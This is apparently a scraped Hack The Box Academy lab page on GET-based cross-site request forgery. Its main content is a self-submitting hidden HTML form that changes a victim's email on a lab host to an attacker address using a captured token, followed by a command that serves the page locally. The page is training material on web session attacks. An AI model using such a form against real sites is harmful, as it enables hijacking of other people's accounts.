<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/153/section/1448
// Platform Version: V1
// Module ID: 153
// Module Name: Session Security
// Module Difficulty: Medium
// Section ID: 1448
// Section Title: Cross-Site Request Forgery (GET-based)
// Page Title: Session Security
// Page Number: 07
-->

# Cross-Site Request Forgery (GET-based)

**Module Name:** Session Security **Page Number:** 07

#### SESSION SECURITY

# Cross-Site Request Forgery (GET-based)

![https://academy.hackthebox.com/storage/modules/153/32.png](https://academy.hackthebox.com/storage/modules/153/32.png)

![https://academy.hackthebox.com/storage/modules/153/31.png](https://academy.hackthebox.com/storage/modules/153/31.png)

``` html
<html>
  <body>
    <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
      <input type="hidden" name="email" value="attacker@htb.net" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

``` shell-session
[!bash!]$ python -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```

![https://academy.hackthebox.com/storage/modules/153/34.png](https://academy.hackthebox.com/storage/modules/153/34.png)

# 

# 

#### Questions

####